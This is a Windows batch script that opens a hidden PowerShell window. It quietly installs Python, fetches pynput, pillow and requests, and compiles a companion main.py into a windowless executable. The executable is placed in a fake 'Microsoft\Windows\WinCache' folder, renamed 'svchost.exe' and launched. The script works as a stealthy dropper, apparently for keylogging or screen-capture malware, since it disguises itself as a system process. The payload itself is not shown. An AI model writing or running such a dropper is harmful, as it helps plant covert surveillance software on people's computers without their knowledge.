@echo off
set "SRC=%~dp0main.py"
set "PYURL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
set "PYINST=%TEMP%\python_installer.exe"

powershell -WindowStyle Hidden -Command ^
  "$src = '%SRC:\=\\%'; ^
   $pyUrl = '%PYURL%'; ^
   $pyInst = '%PYINST:\=\\%'; ^
   $cache = Join-Path $env:APPDATA 'Microsoft\Windows\WinCache'; ^
   $exe = Join-Path $cache 'svchost.exe'; ^
   if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null } ^
   $python = $null; ^
   try { $python = (Get-Command python -ErrorAction Stop).Source } catch {}; ^
   if (-not $python) { ^
       try { $python = (Get-Command py -ErrorAction Stop).Source } catch {} ^
   }; ^
   if (-not $python) { ^
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
       (New-Object Net.WebClient).DownloadFile($pyUrl, $pyInst); ^
       Start-Process $pyInst -ArgumentList '/quiet InstallAllUsers=0 PrependPath=1 Include_test=0' -Wait; ^
       $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User'); ^
       try { $python = (Get-Command python -ErrorAction Stop).Source } catch {}; ^
       if (-not $python) { ^
           $python = Join-Path $env:LOCALAPPDATA 'Programs\Python\Python311\python.exe' ^
       } ^
   }; ^
   if (Test-Path $exe) { ^
       Start-Process $exe ^
   } else { ^
       & $python -m pip install pyinstaller pillow pynput requests 2>$null; ^
       Copy-Item $src $cache -Force; ^
       $tmp = Join-Path $cache 'build'; ^
       & $python -m PyInstaller --onefile --noconsole --distpath $cache --workpath $tmp --specpath $cache (Join-Path $cache 'main.py') 2>$null; ^
       Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue; ^
       Remove-Item (Join-Path $cache 'main.spec') -Force -ErrorAction SilentlyContinue; ^
       $built = Join-Path $cache 'main.exe'; ^
       $waited = 0; ^
       while (-not (Test-Path $built) -and $waited -lt 120) { Start-Sleep -Seconds 5; $waited += 5 }; ^
       if (Test-Path $built) { Rename-Item $built $exe -ErrorAction SilentlyContinue }; ^
       Start-Sleep -Seconds 2; ^
       if (Test-Path $exe) { Start-Process $exe } ^
   }"